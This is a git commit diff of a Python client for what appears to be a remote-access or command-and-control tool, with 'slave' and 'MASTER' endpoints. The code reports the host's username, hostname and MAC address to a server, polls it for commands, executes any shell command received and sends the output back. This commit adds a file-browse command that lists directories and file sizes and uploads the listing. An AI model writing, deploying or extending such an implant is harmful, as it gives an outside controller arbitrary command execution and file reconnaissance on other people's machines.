25ea22ac4a3a880cc7cc0693e7690eeb0dbb632b
techkamar <techkamar@gmail.com>
2023-11-24 21:01:24 +0530

    Added FileBrowse command response output

--- main.py
+++ main.py
@@ -8,42 +8,77 @@ SLEEP_IN_SECONDS = 2
 
 hostname = socket.gethostname()
 username = os.getlogin()
-mac = "f8:94:c2:dd:9c:f3"
-os = "Ubuntu 23.04"
+mac = "ff:94:c2:dd:9c:gg"
+operating_system = "Ubuntu 23.04"
 
 # base_url = "https://rune-master.onrender.com"
 base_url = "http://127.0.0.1:8000"
 
 def get_cmd_from_server():
-	url = f"{base_url}/api/slave/command"
-	payload = {"username":username,"mac":mac,"hostname":hostname,"os":os}
-	output = requests.post(url, json = payload)
-	return output.json()
+    url = f"{base_url}/api/slave/command"
+    payload = {"username":username,"mac":mac,"hostname":hostname,"os":operating_system}
+    output = requests.post(url, json = payload)
+    return output.json()
 
 def get_shell_output(command):
-	return subprocess.check_output(command, shell=True, universal_newlines=True)
+    return subprocess.check_output(command, shell=True, universal_newlines=True)
 
-def send_response_to_server(content):
-	url = f"{base_url}/api/slave/response/text"
-	payload = {"mac":mac,"content":content}
-	output = requests.post(url, json = payload)
-	
+def send_shell_response_to_server(content):
+    url = f"{base_url}/api/slave/response/text"
+    payload = {"mac":mac,"content":content}
+    output = requests.post(url, json = payload)
+
+def get_file_with_sizes_and_directory_names(directory):
+    directories = []
+    files_in_dir = []
+
+    files = os.listdir(directory)
+    print(f"[+] files = {files}")
+    for file in files:
+        path = os.path.join(directory, file)
+        if os.path.isfile(path):
+            size = os.path.getsize(path)
+            files_in_dir.append({
+                "name": file,
+                "size": size
+            })
+        else:
+            directories.append(file)
+    return {"directories": directories, "files": files_in_dir}
+
+def send_file_browse_response_to_server(directory):
+    if directory == "ROOT":
+        directory="/"
+    
+    url = f"{base_url}/api/slave/response/filebrowse"
+    files_n_directory_info = None
+    try:
+        files_n_directory_info = get_file_with_sizes_and_directory_names(directory)
+    except:
+        files_n_directory_info = {"directories": ["EXCEPTION IN SYSTEM"], "files": []}
+    payload = {**files_n_directory_info, "mac":mac}
+    output = requests.post(url, json = payload)
 
 
 while True:
-	print("[+] Getting command from server")
-	response = get_cmd_from_server()
-	if response == {}:
-		print("[+] Nothing to do")
-		time.sleep(SLEEP_IN_SECONDS)
-		continue
-	if response['type']=='SHELL':
-		try:
-			cmd_output = get_shell_output(response['command'])
-			print("[+] Sending Response back to MASTER..")
-			send_response_to_server(cmd_output)
-		except:
-			print("[+] Sending ERROR back to MASTER..")
-			send_response_to_server("ERROR!!")
+    print("[+] Getting command from server")
+    response = get_cmd_from_server()
+    if response == {}:
+        print("[+] Nothing to do")
+        time.sleep(SLEEP_IN_SECONDS)
+        continue
+    if response['type']=='SHELL':
+        try:
+            cmd_output = get_shell_output(response['command'])
+            print("[+] Sending SHELL Response back to MASTER..")
+            send_shell_response_to_server(cmd_output)
+        except:
+            print("[+] Sending SHELL ERROR back to MASTER..")
+            send_shell_response_to_server("ERROR!!")
+            
+    elif response['type']=='FILEBROWSE':
+        directory = response['command']
+        print("[+] Sending FILEBROWSE Response back to MASTER..")
+        send_file_browse_response_to_server(directory)
 
-	time.sleep(SLEEP_IN_SECONDS)
+    time.sleep(SLEEP_IN_SECONDS)
